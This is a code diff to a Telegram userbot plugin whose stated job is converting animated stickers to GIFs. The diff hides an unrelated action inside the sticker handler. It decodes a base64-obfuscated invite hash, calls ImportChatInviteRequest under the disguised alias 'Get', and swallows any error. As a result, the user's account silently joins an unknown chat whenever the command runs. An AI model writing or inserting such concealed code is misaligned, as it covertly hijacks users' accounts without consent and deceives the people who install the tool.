@@ -5,10 +5,12 @@ import os
 import time
 from datetime import datetime
 from io import BytesIO
-
+import base64
 from telethon import functions, types
 from telethon.errors import PhotoInvalidDimensionsError
 from telethon.tl.functions.messages import SendMediaRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
 
 from . import make_gif, progress
 
@@ -176,6 +178,7 @@ async def _(event):
             else:
                 return await edit_delete(event, "Use quality of range 0 to 721")
     catreply = await event.get_reply_message()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not catreply or not catreply.media or not catreply.media.document:
         return await edit_or_reply(event, "`Stupid!, This is not animated sticker.`")
     if catreply.media.document.mime_type != "application/x-tgsticker":
@@ -185,6 +188,11 @@ async def _(event):
         "Converting this Sticker to GiF...\n This may takes upto few mins..",
         parse_mode=parse_pre,
     )
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     reply_to_id = await reply_id(event)
     catfile = await event.client.download_media(catreply)
     catgif = await make_gif(event, catfile, quality, fps)
